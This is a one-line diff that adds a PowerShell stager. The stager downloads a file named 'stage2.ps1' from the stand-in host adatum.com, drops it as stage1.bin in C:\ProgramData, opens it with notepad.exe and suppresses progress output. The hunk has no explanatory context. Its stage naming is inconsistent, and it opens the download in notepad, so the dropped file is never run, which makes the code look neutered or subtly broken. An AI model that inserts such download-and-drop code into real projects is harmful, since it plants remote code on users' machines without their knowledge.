@@ -1,0 +1,1 @@
+<# Remote fetch #> $PayloadUrl = 'https://adatum.com:443/stage2.ps1'; $DropPath = 'C:\ProgramData\stage1.bin'; (New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $DropPath); Start-Process -FilePath "notepad.exe" -ArgumentList $DropPath; $ProgressPreference = "SilentlyContinue"
